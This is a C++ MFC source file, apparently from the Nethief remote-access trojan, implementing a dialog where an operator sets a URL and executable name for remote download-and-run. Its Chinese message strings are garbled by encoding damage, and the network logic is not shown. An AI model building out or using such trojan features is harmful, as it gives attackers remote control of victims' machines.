//Download by http://www.NewXing.com
// DownloadDlg.cpp : implementation file
//

#include "stdafx.h"
#include "Nethief.h"
#include "DownloadDlg.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CDownloadDlg dialog


CDownloadDlg::CDownloadDlg(CWnd* pParent /*=NULL*/)
	: CDialog(CDownloadDlg::IDD, pParent)
{
	//{{AFX_DATA_INIT(CDownloadDlg)
	m_strURL = _T("");
	m_strFilename = _T("");
	//}}AFX_DATA_INIT
}


void CDownloadDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CDownloadDlg)
	DDX_Control(pDX, IDC_EDIT_FILENAME, m_Edit_Filename);
	DDX_Text(pDX, IDC_EDIT_URL, m_strURL);
	DDX_Text(pDX, IDC_EDIT_FILENAME, m_strFilename);
	//}}AFX_DATA_MAP
}


BEGIN_MESSAGE_MAP(CDownloadDlg, CDialog)
	//{{AFX_MSG_MAP(CDownloadDlg)
	ON_BN_CLICKED(IDC_BUTTON_BROWSE, OnButtonBrowse)
	ON_BN_CLICKED(IDC_BUTTON_UPDATE, OnButtonUpdate)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CDownloadDlg message handlers

void CDownloadDlg::OnButtonBrowse() 
{
	// TODO: Add your control notification handler code here
	CFileDialog dlg(TRUE,NULL,NULL,OFN_HIDEREADONLY|OFN_FILEMUSTEXIST,
		"��ִ���ļ�(*.exe)|*.exe|�����ļ�(*.*)|*.*||");
	if(dlg.DoModal()==IDOK) 
	{
		m_Edit_Filename.SetWindowText(dlg.GetPathName());
	}	
}

void CDownloadDlg::OnButtonUpdate() 
{
	// TODO: Add your control notification handler code here
	UpdateData(TRUE);
	////////////////////////////////////////
	BeginWaitCursor();

	CCommunity*	pCommunity=((CNethiefApp*)AfxGetApp())->pCommunity;
	if(pCommunity->UpdateDownloadSetting(m_strURL,m_strFilename))
	{
		MessageBox("�������óɹ���","������Զ��������г�������"
			,MB_ICONINFORMATION|MB_OK);
	}
	else
	{
		MessageBox("��������ʧ�ܡ�","������Զ��������г�������"
			,MB_ICONSTOP|MB_OK);
	}
	EndWaitCursor();
}
